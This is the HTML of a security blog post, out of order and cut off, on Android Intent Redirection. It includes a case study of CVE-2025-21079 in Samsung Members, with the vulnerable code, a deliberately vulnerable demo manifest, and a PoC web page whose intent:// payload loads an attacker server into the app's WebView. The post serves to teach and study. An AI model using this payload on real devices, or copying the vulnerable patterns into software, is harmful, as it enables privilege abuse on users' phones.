+&lt;p&gt;Android 16 blocks this pattern at the OS level. When both the app&amp;#x2019;s targetSdk and the OS are Android 16, an Intent taken out of an extra is blocked from execution by default. However, if the developer calls &lt;code&gt;removeLaunchSecurityProtection()&lt;/code&gt; on the taken-out Intent, this protection is lifted.&lt;/p&gt;
+&lt;h2 id=&#34;4-1-Day-Case-CVE-2025-21079&#34;&gt;&lt;a href=&#34;#4-1-Day-Case-CVE-2025-21079&#34; class=&#34;headerlink&#34; title=&#34;4. 1-Day Case: CVE-2025-21079&#34;&gt;&lt;/a&gt;4. 1-Day Case: CVE-2025-21079&lt;/h2&gt;&lt;p&gt;Let&amp;#x2019;s look at &lt;a href=&#34;https://djini.ai/posts/pwn2own-2025-samsung-members-webview-takeover-and-intent-redirection/&#34;&gt;CVE-2025-21079&lt;/a&gt;, a real-world case of Intent Redirection. This vulnerability was demonstrated at Pwn2Own Ireland 2025. It is a vulnerability that chains from the Samsung Members app and ultimately allows launching an Activity with System privileges. It is a chain that displays an attacker-controlled URL in the WebView inside the Samsung Members app and, through that WebView, connects all the way to Intent Redirection.&lt;/p&gt;
+&lt;h3 id=&#34;4-1-Webview&#34;&gt;&lt;a href=&#34;#4-1-Webview&#34; class=&#34;headerlink&#34; title=&#34;4.1. Webview&#34;&gt;&lt;/a&gt;4.1. Webview&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;String url = getIntent().getStringExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;url&amp;quot;&lt;/span&gt;);
+String viewType = getIntent().getStringExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;viewType&amp;quot;&lt;/span&gt;);
+&lt;span class=&#34;hljs-keyword&#34;&gt;boolean&lt;/span&gt; allowWithoutLogin =
+        getIntent().getBooleanExtra(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ALLOW_WITHOUT_LOGIN&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;false&lt;/span&gt;);
+
+&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (ActionUri.canPerformActionLink(getIntent())
+        &amp;amp;&amp;amp; (allowWithoutLogin || isLoggedIn())) { &lt;span class=&#34;hljs-comment&#34;&gt;// vuln&lt;/span&gt;
+    route(ActionUri.NEWS_AND_TIPS_DETAIL, getIntent().getExtras());
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;If &lt;code&gt;allowWithoutLogin&lt;/code&gt; is &lt;code&gt;true&lt;/code&gt;, it routes immediately without checking &lt;code&gt;isLoggedIn()&lt;/code&gt;, so if the attacker simply puts &lt;code&gt;ALLOW_WITHOUT_LOGIN=true&lt;/code&gt; in the extra, they can enter the internal screen without logging in.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;INAPP&amp;quot;&lt;/span&gt;.equals(viewType) &amp;amp;&amp;amp; url != &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt; &amp;amp;&amp;amp; url.startsWith(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http&amp;quot;&lt;/span&gt;)) {
+    webView.getSettings().setJavaScriptEnabled(&lt;span class=&#34;hljs-keyword&#34;&gt;true&lt;/span&gt;);
+    webView.setWebViewClient(&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; yi3());
+    webView.loadUrl(url); &lt;span class=&#34;hljs-comment&#34;&gt;// vuln&lt;/span&gt;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It only checks whether &lt;code&gt;viewType&lt;/code&gt; is &lt;code&gt;&amp;quot;INAPP&amp;quot;&lt;/code&gt; and &lt;code&gt;url&lt;/code&gt; starts with &lt;code&gt;http&lt;/code&gt;, then calls &lt;code&gt;loadUrl(url)&lt;/code&gt;. Since it does not validate the target host or domain at all, if the attacker puts their own server address in the extra &lt;code&gt;url&lt;/code&gt;, that page is loaded as-is into Samsung Members&amp;#x2019; WebView.&lt;/p&gt;
+&lt;h3 id=&#34;4-2-Intent-Redirection&#34;&gt;&lt;a href=&#34;#4-2-Intent-Redirection&#34; class=&#34;headerlink&#34; title=&#34;4.2. Intent Redirection&#34;&gt;&lt;/a&gt;4.2. Intent Redirection&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;shouldOverrideUrlLoading&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(WebView view, WebResourceRequest req)&lt;/span&gt; &lt;/span&gt;{
+    String url = req.getUrl().toString();
+    oh6.L(activity, url);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;true&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;yi3.shouldOverrideUrlLoading&lt;/code&gt; intercepts every URL the WebView tries to navigate to, turns it into a string, and passes it to &lt;code&gt;oh6.L&lt;/code&gt;. If the attacker&amp;#x2019;s server returns an &lt;code&gt;intent:&lt;/code&gt; URL as a 302 response to the page loaded in step 1, that URL reaches &lt;code&gt;oh6.L&lt;/code&gt; as-is.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs java&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(Activity activity, String str)&lt;/span&gt; &lt;/span&gt;{
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (TextUtils.isEmpty(str)) &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!str.startsWith(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;intent:&amp;quot;&lt;/span&gt;)) &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt;;
+    &lt;span class=&#34;hljs-keyword&#34;&gt;try&lt;/span&gt; {
+        Intent uri = Intent.parseUri(str, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
+        activity.getPackageManager().getPackageInfo(uri.getPackage(), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+        activity.startActivity(uri); &lt;span class=&#34;hljs-comment&#34;&gt;// vuln&lt;/span&gt;
+    } &lt;span class=&#34;hljs-keyword&#34;&gt;catch&lt;/span&gt; (Exception e) {
+    }
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The component, action, and extra of the delivered Intent are all values the attacker wrote into the &lt;code&gt;intent:&lt;/code&gt; URL, and &lt;code&gt;oh6.L&lt;/code&gt; does not check at all whether the source or target is safe. Since the entity calling &lt;code&gt;startActivity&lt;/code&gt; is Samsung Members, this Intent is fired with Samsung Members&amp;#x2019; permissions and launches any installed exported component with one click.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs html&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;button&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;style&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;height:200px;width:200px&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;onclick&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;yaystartyay()&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;yaypocyay&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;button&lt;/span&gt;&amp;gt;&lt;/span&gt;
+
+    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;text/javascript&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;        &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;yaystartyay&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; yayhostyay = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;172.16.30.113&amp;quot;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;javascript&#34;&gt;            &lt;span class=&#34;hljs-comment&#34;&gt;// open com.samsung.android.voc&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;javascript&#34;&gt;            location.href=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;intent://view/newsAndTipsDetail#Intent;S.viewType=INAPP;scheme=voc;B.ALLOW_WITHOUT_LOGIN=true;S.url=http%3A%2F%2F&amp;quot;&lt;/span&gt; + yayhostyay + &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%3A8000%2Fyayredirect1yay;end&amp;quot;&lt;/span&gt;;&lt;/span&gt;
+        }
+
+    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;h1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The code above is the HTML code on the malicious web page that contains the Intent Redirection payload. In other words, it bypasses the &lt;code&gt;intent: URL&lt;/code&gt; check in the WebView, and the app interprets it with &lt;code&gt;parseUri&lt;/code&gt; and executes it as-is. Through this, any exported Activity of an installed package can be launched with a single click.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image%206.png&#34; alt=&#34;[Pwn2Own 2025 &amp;#x2013; Part 1: Samsung Members WebView Takeover &amp;amp; Intent Redirection (CVE-2025-21079) | Djini AI](https://djini.ai/posts/pwn2own-2025-samsung-members-webview-takeover-and-intent-redirection/)&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://djini.ai/posts/pwn2own-2025-samsung-members-webview-takeover-and-intent-redirection/&#34;&gt;Pwn2Own 2025 &amp;#x2013; Part 1: Samsung Members WebView Takeover &amp;amp; Intent Redirection (CVE-2025-21079) | Djini AI&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Looking at the GIF of the PoC process, triggering the PoC link from the malicious URL with one click goes through the Samsung Members app and ultimately launches the Settings app. Since the Settings app is a System-privileged app holding UID 1000, this PoC confirms that a 1-Click System Activity Launch is possible. The article explains that the Pwn2Own chain was then completed with a chain continuing into Samsung Account and Bixby.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image%207.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;As revealed in Android&amp;#x2019;s development philosophy examined earlier, Android has the characteristic of isolation between apps. Because of this, the representative means of affecting another app is exactly the Intent, and in terms of impact such as Lateral Movement as well as from a vulnerability and exploitation perspective, Intent Redirection is very important in Android.&lt;/p&gt;
+&lt;p&gt;And through this vulnerability, via an app without permissions or via input, one can obtain or access high privileges such as system (UID 1000). That is why it frequently appears and is used at Pwn2Own as well.&lt;/p&gt;
+&lt;p&gt;In my personal opinion, now that countless vulnerabilities are being found and patched with LLMs, I think this is a vulnerability that is relatively hard for AI to find. Compared to Memory Corruption, where the vulnerability is immediately revealed in the code through static analysis, I think the strength of Intent Redirection&amp;#x2014;which arises in communication between other apps that looks as if it were normal&amp;#x2014;is becoming apparent.&lt;/p&gt;
+&lt;p&gt;So! I&amp;#x2019;ll work hard to find vulnerabilities and try to write the next article with a vulnerability I found myself!&lt;/p&gt;
+&lt;p&gt;Next time, I&amp;#x2019;ll be back as Part 3 with another teammate. Thank you!&lt;/p&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/2026/11/26/newp1ayer48/android1/en/image.png">
+  <meta property="og:url" content="https://hackyboiz.github.io/">
+
+  <link rel="canonical" href="https://hackyboiz.github.io/2026/11/26/newp1ayer48/android1/en/">
+
+  <title>[Two paths, Same Dream] A Weapon for Those Without Rooting: Intent Redirection Part 1. (EN) - hackyboiz</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
+<link rel="stylesheet" href="/.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+<link rel="stylesheet" href="/.css">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+</head>
+
+
+<body>
+  <header style="height: 40vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-addrcard"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/author/">
+                <i class="iconfont icon-user-fill"></i>
+                Author
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2026-11-26 17:00" pubdate>
+      2026년 11월 26일 오후
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.5k 자
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      69
+       분
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2">
+      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+    </div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">[Two paths, Same Dream] A Weapon for Those Without Rooting: Intent Redirection Part 1. (EN)</h1>
+                       
+            <div class="markdown-body" id="post-body">
+              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              <!-- hackyboiz_horizen_index -->
+              <!--
+              <ins class="adsbygoogle"
+                   style="display:block"
+                   data-ad-client="ca-pub-3672652207808168"
+                   data-ad-slot="8887862313"
+                   data-ad-format="auto"
+                   data-full-width-responsive="true"></ins>
+              <script>
+                   (adsbygoogle = window.adsbygoogle || []).push({});
+              </script>
+              -->
+              <p><img src="image.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>Hello! I&#x2019;m <code>newp1ayer48</code>, the one handling the lowest place (low-level) at Hackyboiz, now looking toward higher places! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p>
+<p>With the Two paths, Same Dream project I&#x2019;ve been looking at Android, and within that I focus mainly on the application layer on Samsung Galaxy. There&#x2019;s a sad story behind this: on Samsung Galaxy, rooting is blocked by default starting from the One UI 8.5 (Android 16) version. Because rooting would therefore require yet another 0-day&#x2026; I shout &#x201C;actually, even better&#x201D; and focus mainly on logical bugs.</p>
+<p>The main topic of this article is intent redirection, a vulnerability characteristic of Android and at the same time a frequently used logical bug vulnerability. Through it, without memory corruption or command injection, you can even reach a shell with high privileges such as system!</p>
+<h2 id="1-Intent"><a href="#1-Intent" class="headerlink" title="1. Intent"></a>1. Intent</h2><p>Intent was already introduced in the previous <a href="https://hackyboiz.github.io/2026/10/12/Libera/Two_paths,Same_Dream_Part0/En/">Part 0 research article</a>, but since it is an important concept, let&#x2019;s go over it again. In particular, let&#x2019;s look at why the Intent form was used when Android was first developed and designed.</p>
+<p>Android is an operating system designed on the philosophy that &#x201C;anyone can upload an app and anyone can install it.&#x201D; Therefore, developing programs in an unmanaged language that can directly access memory, like traditional C/C++, would have been a major performance/security risk. In addition, the Android application model had to be designed in a form that satisfies the following four constraints and conditions.</p>
+<ol>
+<li>Speed: the system must be able to spin up a process for any part of an app when needed, and be launchable from multiple entry points.</li>
+<li>Lifecycle: a process can die at any time, and there may be no receiver.</li>
+<li>Name resolution: there are cases where the system cannot point to something by name, as with third-party apps, or does not know it.</li>
+<li>Security: each app must be isolated by UID.</li>
+</ol>
+<p>Therefore, a simple remote method call alone cannot satisfy these.</p>
+<p><img src="image%201.png" srcset="/img/loading.gif" alt="[https://medium.com/@esc4nor9/android-security-internals-notes-part-1-8ac593930cd2](https://medium.com/@esc4nor9/android-security-internals-notes-part-1-8ac593930cd2)"></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://medium.com/@esc4nor9/android-security-internals-notes-part-1-8ac593930cd2">https://medium.com/@esc4nor9/android-security-internals-notes-part-1-8ac593930cd2</a></p>
+<p>To solve this problem, Binder IPC was adopted. This is a mechanism that already exists in the Linux Kernel. The Binder residing in the kernel delivers communication between different processes in the form of IPC messages. Through this, isolation between processes (apps) can be achieved.</p>
+<p>A similar structure in the form of XPC can also be seen in iOS and macOS.</p>
+<p><img src="image%202.png" srcset="/img/loading.gif" alt="[https://developer.android.com/guide/platform?hl=ko](https://developer.android.com/guide/platform?hl=ko)"></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://developer.android.com/guide/platform?hl=ko">https://developer.android.com/guide/platform?hl=ko</a></p>
+<p>Therefore, the messages used for inter-app communication in Android must take the form of described data so that the system can read, interpret, store, and delegate them. For this reason, in addition to Binder IPC, the Java-level Intent is introduced to achieve the constraints and conditions mentioned earlier.</p>
+<p>The Android architecture can be seen as in the picture above, and can be broadly divided into the Java Level, which runs on the Java framework, and the C Level, which runs on the Native Library/Linux Kernel. In this architecture diagram, Intent can be seen as belonging to the Java Level, and Binder IPC to the C Level.</p>
+<p><img src="image%203.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>Mapping this to the earlier Android architecture diagram, the process of sending an Intent message from App A to App B is illustrated as above. The intent object created at App A&#x2019;s Java framework layer generates a parcel message in the native library. The binder delivers it in IPC form, and in between, the system_server with System privileges (UID 1000) performs a permission check. If it passes, delivery to App B is completed, and the structure is such that the Intent is read from the parcel message and handled in App B.</p>
+<h2 id="2-Intent-Redirection"><a href="#2-Intent-Redirection" class="headerlink" title="2. Intent Redirection"></a>2. Intent Redirection</h2><p><img src="image%204.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>A good example for observing Intent with our own eyes is the notification. The entity that displays and triggers a notification is SystemUI (the system UI process), but when you tap a notification and it is sent, the actual Intent runs with the identity and permissions of the original app that created the notification. For example, when you tap the action button of a calendar notification or the body of a message notification, that Intent is fired not with SystemUI&#x2019;s permissions but with the calendar/message app&#x2019;s permissions. The basic idea of Intent Redirection starts right here.</p>
+<p>In the normal case, App A can only launch App B&#x2019;s exported components. A component with <code>android:exported=&quot;false&quot;</code> can only be launched by the same app (the same UID). Intent Redirection bypasses this access control through a proxied execution that runs with that app&#x2019;s permissions. For this reason, Intent Redirection is classified as a logical bug vulnerability that falls under the Confused Deputy problem.</p>
+<p>The attacker does not call the private component directly. Instead, they send data to the victim app&#x2019;s exported component, and make the victim app send, on their behalf, the Intent built from that data via <code>startActivity()</code> and the like. As far as the system is concerned, the caller is not the attacker but the victim app.</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>&#xC9C0;&#xC810;</th>
+<th>&#xBC1C;&#xC0AC; API</th>
+<th>&#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB178;&#xB9AC;&#xB294; &#xAC83;</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Activity</td>
+<td><code>startActivity()</code>, <code>startActivityForResult()</code></td>
+<td>Launch a private Activity, steal result data</td>
+</tr>
+<tr>
+<td>Broadcast Receiver</td>
+<td><code>sendBroadcast()</code>, <code>sendOrderedBroadcast()</code></td>
+<td>Deliver a crafted broadcast to a private Receiver, forge a protected action</td>
+</tr>
+<tr>
+<td>Content Provider</td>
+<td>Intent data URI(<code>content://</code>) + <code>FLAG_GRANT_READ/WRITE_URI_PERMISSION</code></td>
+<td>Delegate access to a private provider to the attacker&#x2019;s component &#x2192; steal files/DB</td>
+</tr>
+<tr>
+<td>PendingIntent</td>
+<td><code>PendingIntent.send()</code> (including notifications)</td>
+<td>Fire a stored Intent on behalf, with the original app&#x2019;s permissions</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>Intent redirection is ultimately the victim app firing an attacker-influenced Intent somewhere with its own permissions. The sinks where this firing happens are, given the Android component structure, broadly four.</p>
+<ul>
+<li>Activity: a single screen the user sees and operates. For example, in a messaging app, the conversation list screen, the conversation content screen, and the message composition screen are each an Activity. Launching an app or moving to another screen is the act of starting an Activity (startActivity).</li>
+<li>Broadcast Receiver: a component that listens and reacts to events (broadcasts) emitted by the system or other apps. For example, when events like &#x201C;boot completed,&#x201D; &#x201C;battery low,&#x201D; or &#x201C;airplane mode on&#x201D; arrive, the app wakes up and handles them. For instance, an alarm app re-registers alarms after boot, or a messenger starts syncing when the network connection is restored.</li>
+<li>Content Provider: a component that provides structured data (mainly DB/files) to other apps via <code>content://</code> URIs. A representative example is the Contacts Provider, through which a messenger reads the user&#x2019;s address book with the &#x201C;contacts access permission.&#x201D;</li>
+<li>PendingIntent: a PendingIntent is not an &#x201C;Intent to run right now&#x201D; but an Intent token entrusted so that another process can later fire it on behalf of my app. The notification explained as an example earlier is exactly this.</li>
+</ul>
+<h3 id="2-1-Hands-on"><a href="#2-1-Hands-on" class="headerlink" title="2.1. Hands-on"></a>2.1. Hands-on</h3><p>Let&#x2019;s verify Intent Redirection directly through example code and apps in a hands-on manner.</p>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">application</span></span>
+<span class="hljs-tag">        <span class="hljs-attr">android:allowBackup</span>=<span class="hljs-string">&quot;true&quot;</span></span>
+<span class="hljs-tag">        <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;@string/app_name&quot;</span>&gt;</span>
+
+        <span class="hljs-comment">&lt;!-- Launcher: run victim normally to see the legitimate screen --&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span> <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span>
+
+        <span class="hljs-comment">&lt;!-- Entry point reachable by the attacker (the redirection proxy) --&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.RedirectActivity&quot;</span> <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.example.victim.REDIRECT&quot;</span> /&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span>
+
+        <span class="hljs-comment">&lt;!-- Should be reachable only by victim itself --&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.SecretActivity&quot;</span> <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span></code></pre>
+<p>This is the <code>AndroidManifest.xml</code> used by <code>victim.apk</code>. <code>AndroidManifest.xml</code> is the file that specifies the access control and permissions of the app and its components. What we should look at here is that <code>SecretActivity</code> is set to <code>exported=&quot;false&quot;</code>. With this setting, only an app that has this app&#x2019;s UID can access it.</p>
+<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.victim;
+
+<span class="hljs-keyword">import</span> android.app.Activity;
+<span class="hljs-keyword">import</span> android.content.Intent;
+<span class="hljs-keyword">import</span> android.os.Bundle;
+<span class="hljs-keyword">import</span> android.util.Log;
+<span class="hljs-keyword">import</span> android.widget.Toast;
+
+<span class="hljs-keyword">import</span> java.net.URISyntaxException;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RedirectActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Activity</span> </span>{
